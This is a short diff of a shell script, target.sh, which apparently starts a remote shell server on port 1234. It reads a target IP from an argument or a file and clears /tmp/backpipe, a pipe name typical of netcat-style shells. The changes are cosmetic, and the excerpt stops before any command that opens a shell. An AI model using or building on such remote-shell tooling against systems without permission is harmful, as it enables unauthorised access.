@@ -6,19 +6,19 @@
 #
 # Usage Example:  ./target.sh localhost
 #
- if [ "$#" -eq  "0" ]
-   then
-     rip=`cat server.txt`
- else
+if [ "$#" -eq  "0" ]
+  then
+   rip=`cat server.txt`
+  else
      #read rip
      rip=$1
      echo "$rip" > server.txt
- fi
+fi
 
 echo "Server IP: $rip" 
 echo ""
 echo "Starting Up Remote Shell Server, You Will Need Permission...."
-port="1234"
+port=1234
 rip="$1"
 rm /tmp/backpipe
 echo ""
